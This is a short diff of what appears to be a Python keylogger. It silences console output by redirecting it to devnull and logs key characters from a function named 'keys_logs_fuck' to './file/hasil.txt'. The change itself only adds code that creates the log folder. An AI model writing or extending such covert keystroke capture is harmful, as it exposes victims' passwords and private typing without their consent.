@@ -15,7 +15,10 @@ with open(os.devnull, 'w') as fufufafa:
     os.dup2(fufufafa.fileno(), sys.stdout.fileno())
     os.dup2(fufufafa.fileno(), sys.stderr.fileno())
     
+folder = './file'
 
+if not os.path.exists(folder):
+    os.makedirs(folder)
 def keys_logs_fuck(key):
     with open('./file/hasil.txt','a') as ss:
         if hasattr(key, 'char'):
